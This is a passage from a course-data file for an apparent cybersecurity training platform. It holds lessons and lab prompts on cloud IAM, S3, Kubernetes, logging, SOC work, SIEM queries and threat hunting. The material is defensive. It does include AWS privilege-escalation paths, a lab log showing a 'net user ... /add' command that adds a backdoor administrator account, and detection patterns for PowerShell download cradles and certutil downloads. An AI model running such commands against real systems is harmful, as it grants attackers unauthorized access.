**Customer is responsible for:** Operating systems (patching), applications, data encryption, identity and access management, network configuration (VPCs, security groups), and data protection.

### SaaS vs PaaS vs IaaS
| Model | Provider Handles | Customer Handles |
|-------|----------------|-----------------|
| IaaS (EC2, Azure VM) | Physical + hypervisor | Everything above |
| PaaS (Elastic Beanstalk, Heroku) | Infra + runtime | App code + data |
| SaaS (Salesforce, Office 365) | Everything except | Data + access control |

### Common Cloud Security Failures (Customer Responsibility)
- **S3 bucket exposed publicly** — Misconfigured by customer
- **No MFA on root account** — Customer's responsibility
- **Overprivileged IAM roles** — Customer configured
- **Unencrypted RDS database** — Customer chose not to enable
- **Security groups allowing 0.0.0.0/0** — Customer misconfigured

### Cloud Security Frameworks
- **CSA CCM:** Cloud Controls Matrix — comprehensive security control catalog
- **AWS Well-Architected Framework Security Pillar**
- **CIS AWS Foundations Benchmark**
- **NIST SP 800-144:** Guidelines on Security and Privacy in Public Cloud`),
      LAB('cloud-shared-lab1', 'Cloud Responsibility Mapping', 100, 'A company using AWS S3, RDS, and EC2 has a data breach. The investigation reveals: an S3 bucket containing customer PII was publicly accessible, the EC2 instances had not been patched in 9 months, and the RDS database was not encrypted. For each finding: identify whether it falls under AWS or customer responsibility, the specific control that failed, and the remediation. Then describe which CIS AWS Benchmark checks would have caught these issues.', ['shared responsibility', 'S3 bucket', 'CIS benchmark', 'RDS encryption', 'EC2 patching', 'IAM', 'data breach', 'AWS Well-Architected']),
    ],
  },

  {
    id: 'cloud-iam',
    title: 'Cloud IAM & Privilege Management',
    description: 'Design least-privilege IAM policies for AWS, Azure, and GCP; detect and prevent privilege escalation.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-iam-l1', 'Cloud IAM Principles & Privilege Escalation', 75, `## Cloud IAM & Privilege Management

Identity and Access Management is the most critical security control in cloud environments. Most cloud breaches involve IAM misconfigurations or privilege escalation.

### AWS IAM Core Concepts
**Principal:** Who makes the request (User, Role, Service)
**Policy:** JSON document defining allowed/denied actions
**Effect:** Allow or Deny (explicit Deny always wins)
**Action:** API operations (s3:GetObject, ec2:DescribeInstances)
**Resource:** What the action applies to (ARN)

### Least Privilege Principles
- Start with zero permissions; add only what's needed
- Use roles for applications, not access keys (keys can be leaked)
- Set permission boundaries to limit what roles can do
- Use IAM Access Analyzer to identify overly permissive policies
- Review unused permissions — remove IAM roles and users inactive > 90 days

### Privilege Escalation Paths
Common AWS privilege escalation:
- **iam:PassRole + lambda:CreateFunction** → Create Lambda with privileged role
- **iam:CreatePolicyVersion** → Replace policy with AdministratorAccess
- **sts:AssumeRole** → Assume more privileged role if trust policy is misconfigured
- **ec2:RunInstances + iam:PassRole** → Launch EC2 with privileged role

### Detective Controls
- **CloudTrail:** Log all API calls; alert on privilege escalation attempts
- **IAM Access Analyzer:** Find external access to your resources
- **AWS Config Rules:** Continuously check IAM compliance
- **GuardDuty:** Detect anomalous API calls (credential theft indicators)`),
      LAB('cloud-iam-lab1', 'IAM Policy Security Review', 100, 'An AWS IAM policy grants: s3:*, ec2:*, iam:*, with Resource: *. A Lambda function role has iam:CreatePolicyVersion, iam:PassRole, and ec2:RunInstances. Explain: the specific privilege escalation attacks possible with these permissions, write the least-privilege replacement policies for each, describe how IAM Access Analyzer would flag the overpermissive policy, and what CloudTrail alerts you would set up to detect exploitation attempts.', ['IAM policy', 'least privilege', 'privilege escalation', 'iam:PassRole', 'CloudTrail', 'IAM Access Analyzer', 'permission boundary', 'AWS Config']),
    ],
  },

  {
    id: 'cloud-s3-security',
    title: 'S3 Bucket Security',
    description: 'Identify and remediate S3 misconfiguration — the most common cloud data exposure source.',
    category: 'cloud-security',
    difficulty: 'beginner',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-s3-l1', 'S3 Security Controls & Common Misconfigurations', 75, `## S3 Bucket Security

Public S3 buckets have caused some of the largest data breaches in history — Capital One, GoDaddy, Twitch, and hundreds of smaller organizations. S3 security is foundational cloud knowledge.

### S3 Access Control Layers
1. **Block Public Access (BPA):** Account-level and bucket-level setting that overrides all other permissions. Enable on all accounts by default.
2. **Bucket Policy:** Resource-based policy attached to bucket.
3. **ACLs:** Legacy; AWS now recommends disabling ACLs in favor of bucket policies.
4. **IAM Policy:** Identity-based permissions for IAM principals.

### Common Misconfigurations
**Public bucket + sensitive data:** Block Public Access disabled; bucket policy allows s3:GetObject for Principal: "*"

**Overpermissive bucket policy:**
\`\`\`json
{ "Effect": "Allow", "Principal": "*", "Action": "s3:*", "Resource": "arn:aws:s3:::bucket/*" }
\`\`\`
This allows anyone to read, write, and delete.

**Public access via pre-signed URL leak:** Pre-signed URLs shared in logs, Slack, emails, source code.

### Defense Controls
- Enable S3 Block Public Access at the AWS account level
- Encrypt all S3 data (SSE-S3 or SSE-KMS)
- Enable S3 access logging → send to separate security account
- Enable AWS Macie to detect PII in S3 buckets
- Scan buckets with tools: S3Scanner, Trufflesecurity, or Macie
- MFA Delete for versioning + sensitive buckets`),
      LAB('cloud-s3-lab1', 'Audit S3 Bucket Security', 100, 'An AWS environment scan reveals: 3 S3 buckets with Block Public Access disabled, one bucket with a policy allowing Principal:* for s3:GetObject containing HR files, and server access logging is disabled on all buckets. Describe your immediate remediation steps for each finding, how you determine what data was accessed during the exposure window, how AWS Macie helps classify data at risk, and your preventive controls going forward.', ['S3 Block Public Access', 'bucket policy', 'AWS Macie', 'SSE-KMS', 'MFA Delete', 'access logging', 'public bucket', 'data exposure']),
    ],
  },

  {
    id: 'cloud-containers',
    title: 'Container & Kubernetes Security',
    description: 'Secure Docker images, Kubernetes clusters, and container runtimes against modern attack techniques.',
    category: 'cloud-security',
    difficulty: 'advanced',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-container-l1', 'Container Security Attack Surface', 75, `## Container & Kubernetes Security

Containers have transformed deployment but introduced new attack surfaces. A misconfigured Kubernetes cluster can expose your entire infrastructure.

### Container Security Layers
1. **Image:** Base OS vulnerabilities, application dependencies, secrets baked in
2. **Runtime:** Privileged containers, excessive capabilities, host namespace access
3. **Kubernetes API:** Authentication, authorization, network policies
4. **Supply Chain:** Compromised base images, malicious packages

### Common Container Vulnerabilities
**Privileged containers:** Equivalent to root on the host. One container escape compromises the node.

**Root in container:** App runs as root inside container; if container escapes, attacker is root on host.

**Host network/PID namespace:** Container sees host network or all processes — breaks isolation.

**Secrets in environment variables:** \`env | grep -i secret\` in a shell gives attacker all credentials.

### Kubernetes Attack Surface
- **Unauthenticated kubectl access:** Kubelet API open (port 10250) — arbitrary command execution
- **Excessive RBAC:** ServiceAccounts with cluster-admin role
- **Exposed Dashboard:** Kubernetes Dashboard without auth
- **IMDS Access:** Pods can reach cloud instance metadata (SSRF to cloud credentials)

### Hardening Controls
- Scan images: Trivy, Snyk, Amazon ECR scanning
- Non-root containers: \`securityContext.runAsNonRoot: true\`
- Read-only filesystem: \`readOnlyRootFilesystem: true\`
- Drop capabilities: \`capabilities.drop: ["ALL"]\`
- Network policies: Restrict pod-to-pod communication
- OPA Gatekeeper / Kyverno: Policy enforcement for K8s resources
- Secrets management: Vault, AWS Secrets Manager — not env vars`),
      LAB('cloud-container-lab1', 'Kubernetes Security Audit', 100, 'A Kubernetes cluster audit reveals: a Pod running as root with privileged:true, a ServiceAccount with cluster-admin ClusterRoleBinding, no NetworkPolicies, and a secret stored as an environment variable named DB_PASSWORD. For each finding: explain the attack path that exploits it, write the corrected Kubernetes YAML manifest, and describe how OPA Gatekeeper would prevent this configuration in the future.', ['privileged container', 'RBAC', 'ServiceAccount', 'NetworkPolicy', 'OPA Gatekeeper', 'secrets management', 'Vault', 'container escape']),
    ],
  },

  {
    id: 'cloud-cspm',
    title: 'Cloud Security Posture Management',
    description: 'Continuously assess and remediate cloud misconfigurations using CSPM tools.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-cspm-l1', 'CSPM Tools & Cloud Compliance', 75, `## Cloud Security Posture Management

CSPM tools continuously scan cloud environments for misconfigurations, compliance violations, and security risks — giving security teams visibility across thousands of cloud resources.

### Why CSPM Is Necessary
Cloud environments change constantly. Developers provision resources, change settings, and delete infrastructure daily. Manual reviews can't keep pace. CSPM provides continuous automated assessment.

### CSPM Capabilities
- **Misconfiguration detection:** Public S3 buckets, open security groups, unencrypted databases
- **Compliance mapping:** Check against CIS, PCI DSS, HIPAA, SOC 2, NIST frameworks
- **Identity risk:** IAM overpermission, unused credentials, root account usage
- **Network exposure:** Internet-exposed resources, unrestricted ingress rules
- **Data security:** Unencrypted storage, PII in unexpected places

### Major CSPM Tools
| Tool | Type | Notable Feature |
|------|------|----------------|
| AWS Security Hub | Native | Aggregates findings from Guard Duty, Inspector, Macie |
| Microsoft Defender for Cloud | Native | Azure + multi-cloud |
| Prisma Cloud | Commercial | Full-stack cloud security |
| Wiz | Commercial | Attack path analysis |
| Lacework | Commercial | Behavioral analytics |

### Remediation Workflow
1. CSPM generates finding (e.g., "EC2 security group allows SSH from 0.0.0.0/0")
2. Finding routed to ticket system (Jira) with resource owner
3. Owner remediates or documents risk acceptance
4. CSPM re-scans and verifies remediation
5. SLA tracking: critical misconfigs fixed in 24h, high in 7 days`),
      LAB('cloud-cspm-lab1', 'CSPM Findings Remediation', 100, 'Your CSPM tool reports: 1) 45 EC2 security groups with port 22 open to 0.0.0.0/0, 2) 3 IAM users with no MFA, 3) RDS instances with automated backups disabled, 4) CloudTrail logging disabled in 2 regions. Prioritize these findings by risk, write the AWS CLI or Terraform commands to remediate each, describe how AWS Config rules provide ongoing detection, and design an SLA policy for different finding severities.', ['CSPM', 'security group', 'CloudTrail', 'MFA', 'RDS backup', 'AWS Config', 'Terraform', 'compliance']),
    ],
  },

  {
    id: 'cloud-serverless',
    title: 'Serverless Security',
    description: 'Secure AWS Lambda, Azure Functions, and serverless architectures against function-specific attacks.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-serverless-l1', 'Serverless Attack Surface', 75, `## Serverless Security

Serverless architectures eliminate OS management but introduce new attack vectors. The function itself, its IAM permissions, and its triggers all become attack surfaces.

### Serverless Attack Vectors
**Event Injection:** Serverless functions process events from many sources (API Gateway, SQS, S3 notifications). If events contain untrusted data and the function uses it unsafely, injection attacks work just like in traditional apps.

**Overprivileged Execution Role:** Lambda with AdministratorAccess can be used as a pivot point — if exploited, attacker controls your entire AWS environment.

**Dependency Vulnerabilities:** npm/pip packages in function code contain CVEs. Serverless environments update less frequently — package vulnerabilities linger.

**Function URL Exposure:** Lambda Function URLs without auth are publicly accessible. A misconfigured Lambda can expose internal APIs.

**Data Exposure in /tmp:** The /tmp filesystem persists between warm function invocations. Sensitive data left in /tmp can be read by subsequent invocations of potentially different users.

**Secrets in Environment Variables:** CloudWatch logs sometimes capture environment variables in error messages.

### Hardening Controls
- Least-privilege execution role per function
- Input validation in every function handler
- Secrets from AWS Secrets Manager (not env vars)
- Dependency scanning: Snyk, OWASP Dependency Check
- Function-level authorization (not just API Gateway)
- CloudWatch alarms on invocation errors and unusual invocation counts
- AWS WAF in front of API Gateway

### Testing Serverless
Use frameworks like Serverless Application Security Scanner (SAST). Test event injection using all event sources. Review CloudFormation/SAM templates for misconfiguration.`),
      LAB('cloud-serverless-lab1', 'Secure a Lambda Function', 100, 'A Lambda function processes S3 event notifications. It reads filenames from the event, constructs a SQL query with the filename (SQL injection), uses an execution role with s3:*, rds:*, iam:* permissions, and logs the entire event object to CloudWatch (which includes an API key in a field). Fix each issue: parameterize the query, write least-privilege IAM policy, describe how to prevent secrets in CloudWatch logs, and explain how to scan the function\'s dependencies for CVEs.', ['Lambda', 'event injection', 'SQL injection', 'least privilege', 'CloudWatch', 'Secrets Manager', 'dependency scanning', 'serverless IAM']),
    ],
  },

  {
    id: 'cloud-devsecops',
    title: 'Cloud DevSecOps & Infrastructure as Code Security',
    description: 'Integrate security scanning into CI/CD pipelines and secure Terraform/CloudFormation configurations.',
    category: 'cloud-security',
    difficulty: 'advanced',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-devsecops-l1', 'IaC Security & CI/CD Pipeline Security', 75, `## Cloud DevSecOps & Infrastructure as Code Security

Infrastructure as Code (IaC) enables consistent, auditable infrastructure — but misconfigured Terraform and CloudFormation templates deploy vulnerable infrastructure at scale.

### IaC Security Risks
**Hardcoded secrets:** AWS keys, database passwords in .tf files checked into Git. Tools like Trufflehog and GitLeaks scan for these.

**Overpermissive security groups:** \`cidr_blocks = ["0.0.0.0/0"]\` in Terraform security group rules exposes services.

**Public S3 buckets in Terraform:** \`acl = "public-read"\` exposes bucket contents.

**Missing encryption:** \`encrypted = false\` on EBS volumes, RDS instances.

### IaC Scanning Tools
- **Checkov:** Scans Terraform, CloudFormation, Kubernetes — 1000+ built-in policies
- **tfsec:** Fast Terraform-specific static analysis
- **Terrascan:** Multi-cloud IaC scanning with policy-as-code
- **Snyk IaC:** Developer-friendly with fix suggestions

### CI/CD Pipeline Security
The CI/CD pipeline is critical infrastructure — a compromise can deploy malicious code to production.

**Secrets in pipelines:** Use GitHub Actions secrets, AWS Parameter Store, Vault — never hardcode in workflow files.

**Dependency confusion attacks:** Malicious npm/PyPI packages with the same name as internal packages.

**SAST in pipeline:** Run Semgrep, SonarQube on every PR.

**DAST in pipeline:** Run OWASP ZAP against staging after deployment.

**Image scanning:** Scan Docker images before pushing to registry (Trivy in CI).

**Signed commits/artifacts:** Require GPG-signed commits for production branches.`),
      LAB('cloud-devsecops-lab1', 'Secure a CI/CD Pipeline', 100, 'A GitHub Actions workflow has: AWS_ACCESS_KEY_ID hardcoded in the yaml file, npm install run without lock file validation (supply chain risk), Docker images built without scanning, and deployment to production on every push to main without security checks. Redesign the pipeline: how you move credentials to GitHub secrets + OIDC, add dependency integrity checking, add Trivy image scanning, and implement a staging gate with automated security testing before production.', ['OIDC', 'GitHub Actions secrets', 'Trivy', 'Checkov', 'supply chain', 'SAST', 'DAST', 'CI/CD security']),
    ],
  },

  {
    id: 'cloud-logging-monitoring',
    title: 'Cloud Security Logging & Monitoring',
    description: 'Configure comprehensive logging in AWS/Azure and build detection rules for cloud threats.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-log-l1', 'Cloud Logging Architecture & Detection', 75, `## Cloud Security Logging & Monitoring

Without logging, you cannot detect attacks, investigate incidents, or prove compliance. Cloud environments generate massive amounts of telemetry — the challenge is collecting, centralizing, and alerting on the right data.

### AWS Logging Services
**CloudTrail:** Records all API calls. Who did what, when, from where. Essential — enable in all regions.

**VPC Flow Logs:** Network-level logs for VPCs. Source/destination IP, port, protocol, bytes. Detect scanning, exfiltration.

**GuardDuty:** Threat intelligence + ML-based detection. Analyzes CloudTrail, VPC Flow Logs, DNS logs automatically.

**Security Hub:** Aggregates findings from GuardDuty, Inspector, Macie, Firewall Manager into unified dashboard.

**CloudWatch Logs:** Application logs, Lambda logs, ECS logs.

### Critical Log Sources
- CloudTrail: Every API call (especially IAM changes, root usage)
- RDS: Slow query logs, error logs, audit logs
- ALB/API Gateway: HTTP access logs with user agents and source IPs
- S3 Server Access Logging: Who accessed which objects

### Detection Scenarios
| Alert | Log Source | Indicator |
|-------|------------|----------|
| Root account usage | CloudTrail | userIdentity.type=Root |
| IAM privilege escalation | CloudTrail | iam:CreatePolicyVersion or iam:AttachRolePolicy |
| New IAM access key | CloudTrail | CreateAccessKey event |
| Public S3 bucket created | CloudTrail | PutBucketAcl with public-read |
| GuardDuty: credential exfil | GuardDuty | UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration |

### Log Retention & Security
- Store logs in separate security account — attackers cannot delete logs if they compromise app account
- Enable log integrity validation (CloudTrail digest files)
- Minimum 1 year retention for compliance (HIPAA, PCI)`),
      LAB('cloud-log-lab1', 'Build Cloud Detection Rules', 100, 'Design detection rules for these cloud attack scenarios: 1) An attacker using stolen AWS credentials from a different country than the legitimate user. 2) An IAM role being modified to add AdministratorAccess. 3) 10,000 S3 GetObject calls in 5 minutes from a single IP. 4) A new EC2 instance launched in an unused region. For each: which log source, the specific CloudTrail event names, the CloudWatch alarm or GuardDuty finding type, and the automated response via Lambda.', ['CloudTrail', 'GuardDuty', 'CloudWatch alarm', 'anomalous behavior', 'credential theft', 'IAM modification', 'S3 exfiltration', 'Lambda response']),
    ],
  },

  {
    id: 'cloud-incident-response',
    title: 'Cloud Incident Response',
    description: 'Investigate and contain security incidents in AWS environments — from detection to recovery.',
    category: 'cloud-security',
    difficulty: 'advanced',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-ir-l1', 'AWS Incident Response Methodology', 75, `## Cloud Incident Response

Cloud incident response differs significantly from traditional IR. Resources can be destroyed, evidence is ephemeral, and attackers move faster using cloud APIs.

### AWS IR Framework
**Preparation:**
- IR playbooks for common scenarios (compromised key, compromised EC2, data breach)
- Access to CloudTrail + GuardDuty before incident
- Break-glass IAM accounts with pre-configured incident response permissions

**Detection:**
- GuardDuty alert fires (e.g., UnauthorizedAccess:EC2/SSHBruteForce)
- CloudWatch alarm on unusual API activity
- SIEM correlation from CloudTrail + VPC Flow Logs

**Containment:**
- Compromised IAM credentials: Attach deny-all policy, then disable and rotate
- Compromised EC2: Isolate with restrictive security group (0 inbound/outbound), take snapshot
- Compromised account: Engage AWS Support for root account recovery

**Eradication:**
- Find all resources created during attack window in CloudTrail
- Identify backdoors (new IAM users/roles, new Lambda functions, unauthorized S3 lifecycle rules)
- Revoke all sessions (sts:RevokeRole policy)

**Recovery:**
- Deploy from known-good IaC
- Rotate all credentials, access keys
- Verify no persistent access remains

**Post-Incident:**
- Root cause analysis
- Detection gaps identified
- Playbook updated`),
      SIM('cloud-ir-sim1', 'AWS Compromise Response', 100, 'GuardDuty alerts: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration. An EC2 instance role credentials were used from a Tor exit node to list S3 buckets, call GetSecretValue, and launch 50 new EC2 instances in us-west-2. Walk through your complete incident response: immediate containment steps, forensic evidence you preserve, how you identify the scope of compromise, and your communication to leadership.'),
    ],
  },

  {
    id: 'cloud-data-protection',
    title: 'Cloud Data Protection & Encryption',
    description: 'Encrypt data at rest and in transit in AWS, manage keys with KMS, and protect sensitive data.',
    category: 'cloud-security',
    difficulty: 'intermediate',
    accentColor: '#38bdf8',
    modules: [
      L('cloud-data-l1', 'AWS Encryption & Key Management', 75, `## Cloud Data Protection & Encryption

Encryption protects data even when access controls fail. In cloud environments, every data store should have encryption enabled — with keys you control.

### Encryption in AWS
**At Rest:**
- S3: SSE-S3 (managed), SSE-KMS (customer-controlled), SSE-C (customer-provided key)
- EBS: AES-256 via KMS; encrypt by default setting in account
- RDS: Encryption at rest via KMS; must enable at creation time
- DynamoDB: SSE-KMS or AWS owned keys

**In Transit:**
- All AWS API endpoints: TLS 1.2/1.3 enforced
- Internal VPC traffic: Not encrypted by default; use TLS/mTLS between services
- ALB → EC2: Use HTTPS listener with certificate

### AWS Key Management Service (KMS)
**Customer Managed Keys (CMK):** You control rotation, policies, deletion. Keys never leave AWS HSMs.

**Key Policy:** Resource-based policy controlling who can use the key. Separate from IAM — both must allow.

**Key Rotation:** Enable annual automatic rotation for CMKs.

**KMS Key Deletion:** 7-30 day waiting period — prevents accidental deletion.

### Secrets Management
Secrets (passwords, API keys, certificates) need different treatment than encryption keys:
- **AWS Secrets Manager:** Automatic rotation for RDS, Redshift; retrieval via API (no env vars)
- **AWS Parameter Store:** Simpler; free tier; no automatic rotation
- **HashiCorp Vault:** Multi-cloud; dynamic secrets (create a DB user per request, expire after use)

### Macie for Data Classification
AWS Macie uses ML to automatically discover and classify sensitive data (PII, PHI, financial data) in S3 — identifies data you didn't know needed protection.`),
      LAB('cloud-data-lab1', 'Implement End-to-End Encryption', 100, 'Design encryption for a healthcare app on AWS storing patient records: S3 for images, RDS PostgreSQL for records, DynamoDB for session data. Specify: KMS key setup (CMK vs AWS managed), key policies to restrict who can decrypt, how to rotate secrets for the RDS password using Secrets Manager, how Macie detects PHI in S3, and how you enforce TLS-only access to your internal APIs.', ['KMS', 'CMK', 'SSE-KMS', 'Secrets Manager', 'Macie', 'PHI', 'HIPAA', 'TLS enforcement']),
    ],
  },

  // ══════════════════════════════════════════════════
  // DOMAIN 5: SOC & THREAT INTELLIGENCE  (10 courses)
  // ══════════════════════════════════════════════════

  {
    id: 'soc-fundamentals',
    title: 'Security Operations Center Fundamentals',
    description: 'Understand SOC structure, tiers, metrics, and the analyst workflow from alert to resolution.',
    category: 'soc-siem',
    difficulty: 'beginner',
    accentColor: '#e879f9',
    modules: [
      L('soc-fund-l1', 'SOC Structure & Analyst Workflow', 75, `## Security Operations Center Fundamentals

A SOC is the nerve center of an organization's security operations — a team of analysts continuously monitoring for threats and responding to incidents.

### SOC Tiers
**Tier 1 — Alert Analyst:**
- Monitor SIEM dashboards and alert queues
- Triage: is this alert real or a false positive?
- Follow runbooks for common alert types
- Escalate confirmed threats to Tier 2

**Tier 2 — Incident Responder:**
- Deep investigation of confirmed incidents
- Contain and eradicate threats
- Determine root cause and scope
- Write incident reports

**Tier 3 — Threat Hunter / SME:**
- Proactive threat hunting
- Develop new detection content (SIEM rules)
- Research threat intelligence
- Mentor Tier 1/2 analysts

### Key SOC Metrics
- **MTTD (Mean Time to Detect):** How long from intrusion to detection
- **MTTR (Mean Time to Respond):** How long to contain after detection
- **Alert volume:** Total alerts per shift
- **False positive rate:** % of alerts that are not real threats
- **Incidents per analyst per day**

### SOC Tools Stack
- **SIEM:** Splunk, Microsoft Sentinel, Elastic SIEM, QRadar
- **SOAR:** Palo Alto XSOAR, Splunk SOAR — automate repetitive tasks
- **EDR:** CrowdStrike, SentinelOne — endpoint telemetry
- **Threat Intelligence:** MISP, Recorded Future, VirusTotal

### Alert Fatigue
The #1 SOC problem. Too many low-quality alerts cause analysts to miss real threats. Address with: tuning, automation, prioritization, and dedicated time for hunting.`),
      LAB('soc-fund-lab1', 'Triage an Incoming Alert', 100, 'Your SIEM fires: "Possible brute force: 50 failed logins for user admin@company.com in 5 minutes from IP 185.220.101.5, then 1 successful login." Walk through your complete Tier 1 triage: steps to determine if this is a real incident or false positive, what additional context you gather (user history, IP reputation, geolocation), what you do next if confirmed, and how you document your investigation in the ticketing system.', ['brute force', 'SIEM triage', 'IP reputation', 'geolocation', 'account takeover', 'false positive', 'incident ticket', 'escalation']),
    ],
  },

  {
    id: 'soc-siem-mastery',
    title: 'SIEM Platform Mastery',
    description: 'Write detection rules, build dashboards, and manage alerts in Splunk and Microsoft Sentinel.',
    category: 'soc-siem',
    difficulty: 'intermediate',
    accentColor: '#e879f9',
    modules: [
      L('soc-siem-l1', 'SIEM Query Languages & Detection Engineering', 75, `## SIEM Platform Mastery

A SIEM (Security Information and Event Management) platform collects, normalizes, correlates, and alerts on security events. Mastering SIEM query languages is essential for detection engineering.

### SIEM Architecture
1. **Collection:** Log shippers (Splunk Universal Forwarder, Syslog, API pull)
2. **Normalization:** Parse raw logs into structured fields (timestamp, src_ip, dst_ip, event_type)
3. **Correlation:** Match events against detection rules
4. **Alerting:** Trigger on rule matches; route to analyst queue or SOAR
5. **Storage:** Short-term hot (searchable), long-term cold (compliance)

### Splunk SPL Basics
\`\`\`splunk
index=windows EventCode=4625 | stats count by src_ip | where count > 50
index=proxy | search url="*pastebin.com*" | table _time, src_ip, url, bytes
index=firewall action=blocked | timechart count by rule_name
\`\`\`

### Microsoft Sentinel KQL Basics
\`\`\`kql
SecurityEvent
| where EventID == 4625
| summarize FailedLogins = count() by IpAddress
| where FailedLogins > 50
| sort by FailedLogins desc
\`\`\`

### Detection Rule Writing
A good detection rule:
1. Is specific (low false positives)
2. Has a documented rationale
3. References a MITRE ATT&CK technique
4. Has a defined severity and SLA
5. Is tested before production

### Sigma Rules
Sigma is a generic SIEM rule format that compiles to Splunk, KQL, Elastic, QRadar:
\`\`\`yaml
title: PowerShell Download Cradle
logsource: category: process_creation / product: windows
detection:
  selection:
    CommandLine|contains: ['Invoke-Expression', 'IEX', 'DownloadString']
  condition: selection
level: high
\`\`\``),
      LAB('soc-siem-lab1', 'Write a Detection Rule', 100, 'Write Splunk SPL (or Sentinel KQL) detection rules for: 1) A user logging in from two different countries within 30 minutes (impossible travel). 2) PowerShell downloading content from the internet (MITRE T1059.001). 3) A new user added to the Domain Admins group (MITRE T1136). For each: the query, the threshold, the severity, the MITRE technique, and the automated response action.', ['SPL', 'KQL', 'impossible travel', 'PowerShell detection', 'Domain Admins', 'MITRE ATT&CK', 'Sigma', 'detection engineering']),
    ],
  },

  {
    id: 'soc-log-analysis',
    title: 'Log Analysis & Correlation',
    description: 'Analyze Windows Event Logs, Linux syslogs, and application logs to reconstruct attack timelines.',
    category: 'soc-siem',
    difficulty: 'intermediate',
    accentColor: '#e879f9',
    modules: [
      L('soc-log-l1', 'Critical Windows & Linux Log Sources', 75, `## Log Analysis & Correlation

Logs are the raw material of security detection and investigation. Knowing which logs exist and what they tell you is fundamental for any SOC analyst.

### Windows Security Event Log — Key Events
| Event ID | Description | Security Relevance |
|----------|-------------|-------------------|
| 4624 | Successful logon | Baseline; alert on unusual logon types/sources |
| 4625 | Failed logon | Brute force detection |
| 4648 | Logon with explicit credentials | Pass-the-hash, lateral movement |
| 4688 | Process creation | Detect malware, LOLBins |
| 4698 | Scheduled task created | Persistence |
| 4720 | User account created | Backdoor accounts |
| 4728/4732 | User added to privileged group | Privilege escalation |
| 7045 | Service installed | Malware persistence, psexec |

### Windows Sysmon — Extended Visibility
Sysmon (Event IDs 1-30) provides richer telemetry:
- Event 1: Process Create (with command line hash)
- Event 3: Network Connection (process making TCP/UDP connections)
- Event 7: Image Loaded (DLL loading — detect injection)
- Event 8: CreateRemoteThread (process injection)
- Event 11: File Created
- Event 13: Registry Value Set

### Linux Audit Logs
\`\`\`bash
/var/log/auth.log  # SSH logins, sudo commands
/var/log/syslog   # System events
/var/log/audit/audit.log  # auditd — execve, file changes
\`\`\`

### Correlation Example
Attack reconstruction from logs:
1. **4625 × 200** from external IP → brute force
2. **4624 Logon type 3** (network) from same IP → successful login
3. **7045** → Service "PSEXESVC" installed (psexec usage)
4. **4688** → cmd.exe → ipconfig, whoami, net user (discovery)
5. **4688** → powershell.exe → encoded command (C2 staging)`),
      LAB('soc-log-lab1', 'Reconstruct Attack from Logs', 100, 'From the following log sequence, reconstruct the attack: [09:15] Event 4625 x300 from 10.5.0.8 targeting domain\\administrator. [09:22] Event 4624 Logon Type 3, domain\\administrator from 10.5.0.8. [09:23] Event 7045 Service "PSEXESVC" created. [09:23] Event 4688 cmd.exe spawned by psexesvc.exe with args: "whoami && net user hacker Password1! /add && net localgroup administrators hacker /add". Identify each attack phase (MITRE ATT&CK), what data you would pivot to next, immediate containment steps, and what detection rule would catch this earlier.', ['Event 4625', 'Event 4688', 'psexec', 'lateral movement', 'privilege escalation', 'MITRE ATT&CK', 'containment', 'detection rule']),
    ],
  },

  {
    id: 'soc-threat-hunting',
    title: 'Threat Hunting Techniques',
    description: 'Build and execute threat hunt hypotheses using MITRE ATT&CK and behavioral analytics.',
    category: 'soc-siem',
    difficulty: 'advanced',
    accentColor: '#e879f9',
    modules: [
      L('soc-hunt-l1', 'Threat Hunting Methodology', 75, `## Threat Hunting Techniques

Threat hunting is the proactive search for adversaries that have evaded automated detection. Skilled hunters find what SIEM rules miss.

### When to Hunt
- After receiving threat intelligence about a new TTP in your industry
- After a peer organization discloses an incident
- Periodically (weekly/monthly) as routine hygiene
- When MTTD metrics suggest you're missing attacks

### Hunt Methodology
**1. Create a Hypothesis**
"Attackers using Living-off-the-Land (LOLBin) techniques are running reconnaissance using certutil.exe to download payloads."

**2. Define Data Sources**
Windows Event ID 4688 (process creation) + Sysmon Event 1 + Proxy logs

**3. Query**
\`\`\`splunk
index=windows EventCode=4688 Process_Name="certutil.exe"
| search Command_Line="*download*" OR Command_Line="*urlcache*"
| table _time, Computer, Process_Name, Command_Line, Creator_Process
\`\`\`

**4. Analyze Results**
Normal: IT running certutil for certificate management
Abnormal: Certutil downloading from external IP, especially if child of Word/Outlook

**5. Outcome**
- Found threat → IR process
- False positive → tune rule
- No finding → document null result, improve coverage

### Advanced Hunt Techniques
**Frequency Analysis:** Rare process/domain combinations across your fleet
**Clustering:** Group similar behaviors; outliers deserve investigation
**Stack Counting:** Count every unique value; extremes (very high or very low) are interesting
**Process Lineage Analysis:** Unexpected parent-child process relationships`),
      LAB('soc-hunt-lab1', 'Hunt for Living Off the Land', 100, 'Develop a threat hunt for the following hypothesis: "A threat actor is using built-in Windows tools for lateral movement." Your hunt should: identify 5 LOLBins commonly used for lateral movement (e.g., wmic.exe, mshta.exe, bitsadmin.exe), write the Splunk or KQL queries to find abnormal usage of each, define what "normal" vs "suspicious" looks like for each tool, and describe how you would convert a confirmed finding into a permanent detection rule.', ['LOLBin', 'lateral movement', 'wmic', 'mshta', 'bitsadmin', 'threat hunting', 'process creation', 'detection engineering']),
    ],
  },

  {
    id: 'soc-mitre-attack',
    title: 'MITRE ATT&CK Framework',
    description: 'Use MITRE ATT&CK to map attacks, build detection coverage, and understand adversary TTPs.',
    category: 'soc-siem',
    difficulty: 'intermediate',
    accentColor: '#e879f9',
    modules: [
      L('soc-mitre-l1', 'ATT&CK Framework Deep Dive', 75, `## MITRE ATT&CK Framework

MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations. It's the universal language of threat detection and response.

### Framework Structure
**Tactics (14):** The "why" — adversary's goal
